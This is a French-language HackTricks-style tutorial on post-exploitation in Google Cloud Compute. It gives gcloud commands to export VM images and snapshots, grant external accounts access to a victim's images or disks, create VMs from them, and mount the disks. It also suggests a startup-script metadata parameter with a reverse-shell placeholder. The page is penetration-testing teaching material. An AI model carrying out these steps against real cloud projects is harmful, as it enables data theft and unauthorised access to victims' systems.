# GCP - Post-exploitation de Compute

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

- Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
- D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
- **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Compute

Pour plus d'informations sur Compute et VPC (R√©seau), consultez :

{% content-ref url="../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

### Exporter et inspecter des images localement

Cela permettrait √† un attaquant d'**acc√©der aux donn√©es contenues dans des images existantes** ou de **cr√©er de nouvelles images de VM en cours d'ex√©cution** et d'acc√©der √† leurs donn√©es sans avoir acc√®s √† la VM en cours d'ex√©cution.

Il est possible d'exporter une image de VM vers un bucket, puis de la t√©l√©charger et de la monter localement avec la commande :

{% code overflow="wrap" %}
```bash
gcloud compute images export --destination-uri gs://<bucket-name>/image.vmdk --image imagetest --export-format vmdk
# The download the export from the bucket and mount it locally
```
{% endcode %}

Avant de r√©aliser cette action, l'attaquant pourrait avoir besoin de privil√®ges sur le bucket de stockage et bien s√ªr **de privil√®ges sur cloudbuild** car c'est le **service** qui sera charg√© d'effectuer l'export. De plus, pour que cela fonctionne, le SA de codebuild et le SA de compute ont besoin d'autorisations privil√©gi√©es. Le SA de cloudbuild `<project-id>@cloudbuild.gserviceaccount.com` a besoin de :

* roles/iam.serviceAccountTokenCreator
* roles/compute.admin
* roles/iam.serviceAccountUser

Et le SA `<project-id>-compute@developer.gserviceaccount.com` a besoin de :

* roles/compute.storageAdmin
* roles/storage.objectAdmin

### Exporter et inspecter des instantan√©s et des disques localement

Il n'est pas possible d'exporter directement des instantan√©s et des disques, mais il est possible de **transformer un instantan√© en disque, un disque en une image** et en suivant la **section pr√©c√©dente**, exporter cette image pour l'inspecter localement

{% code overflow="wrap" %}
```bash
# Create a Disk from a snapshot
gcloud compute disks create [NEW_DISK_NAME] --source-snapshot=[SNAPSHOT_NAME] --zone=[ZONE]

# Create an image from a disk
gcloud compute images create [IMAGE_NAME] --source-disk=[NEW_DISK_NAME] --source-disk-zone=[ZONE]
```
{% endcode %}

### Inspecter une image en cr√©ant une VM

Dans le but d'acc√©der aux **donn√©es stock√©es dans une image** ou √† l'int√©rieur d'une **VM en cours d'ex√©cution** √† partir de laquelle un attaquant **a cr√©√© une image**, il est possible d'accorder un acc√®s √† un compte externe sur l'image :
```bash
gcloud projects add-iam-policy-binding [SOURCE_PROJECT_ID] \
--member='serviceAccount:[TARGET_PROJECT_SERVICE_ACCOUNT]' \
--role='roles/compute.imageUser'
```
et ensuite cr√©er une nouvelle VM √† partir de celui-ci :
```bash
gcloud compute instances create [INSTANCE_NAME] \
--project=[TARGET_PROJECT_ID] \
--zone=[ZONE] \
--image=projects/[SOURCE_PROJECT_ID]/global/images/[IMAGE_NAME]
```
Si vous ne pouviez pas donner acc√®s √† votre compte externe sur l'image, vous pourriez lancer une VM en utilisant cette image dans le projet de la victime et **faire ex√©cuter les m√©tadonn√©es un shell invers√©** pour acc√©der √† l'image en ajoutant le param√®tre :
```bash
--metadata startup-script='#! /bin/bash
echo "hello"; <reverse shell>'
```
### Inspecter un instantan√©/disque en le connectant √† une VM

Dans le but d'acc√©der aux **donn√©es stock√©es dans un disque ou un instantan√©, vous pourriez transformer l'instantan√© en disque, un disque en une image et suivre les √©tapes pr√©c√©dentes.**

Ou vous pourriez **accorder l'acc√®s √† un compte externe** sur le disque (si le point de d√©part est un instantan√©, accordez l'acc√®s √† l'instantan√© ou cr√©ez un disque √† partir de celui-ci) :
```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \
--member='user:[USER_EMAIL]' \
--role='roles/compute.storageAdmin'
```
**Attacher le disque** √† une instance :
```bash
gcloud compute instances attach-disk [INSTANCE_NAME] \
--disk [DISK_NAME] \
--zone [ZONE]
```
Montez le disque √† l'int√©rieur de la VM :

1. **Connectez-vous en SSH √† la VM** :

```sh
gcloud compute ssh [NOM_INSTANCE] --zone [ZONE]
```
2. **Identifiez le Disque** : Une fois √† l'int√©rieur de la VM, identifiez le nouveau disque en listant les p√©riph√©riques de disque. Vous le trouverez g√©n√©ralement sous la forme `/dev/sdb`, `/dev/sdc`, etc.
3. **Formatez et Montez le Disque** (s'il s'agit d'un disque neuf ou brut) :
*   Cr√©ez un point de montage :

```sh
sudo mkdir -p /mnt/disks/[REP_MONTAGE]
```
*   Montez le disque :

```sh
sudo mount -o discard,defaults /dev/[DISPOSITIF_DISQUE] /mnt/disks/[REP_MONTAGE]
```

Si vous **ne pouvez pas donner acc√®s √† un projet externe** √† l'instantan√© ou au disque, vous devrez peut-√™tre **effectuer ces actions √† l'int√©rieur d'une instance du m√™me projet que l'instantan√©/le disque**.
